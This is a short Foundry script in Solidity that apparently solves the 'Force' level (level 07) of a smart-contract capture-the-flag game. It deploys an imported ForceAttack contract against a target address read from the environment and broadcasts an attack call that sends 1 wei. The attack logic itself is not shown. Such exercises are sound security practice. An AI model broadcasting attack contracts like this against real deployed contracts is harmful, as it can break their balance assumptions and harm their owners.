// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script} from "forge-std/Script.sol";
import {ForceAttack} from "../src/attacks/Level07Force_Attack.sol";

contract ForceScript is Script {
    function setUp() public {}

    function run() public {
        address instanceAddress = vm.envAddress("INSTANCE_ADDRESS");

        vm.startBroadcast();

        ForceAttack attacker = new ForceAttack(instanceAddress);
        attacker.attack{value: 1}();

        vm.stopBroadcast();
    }
}
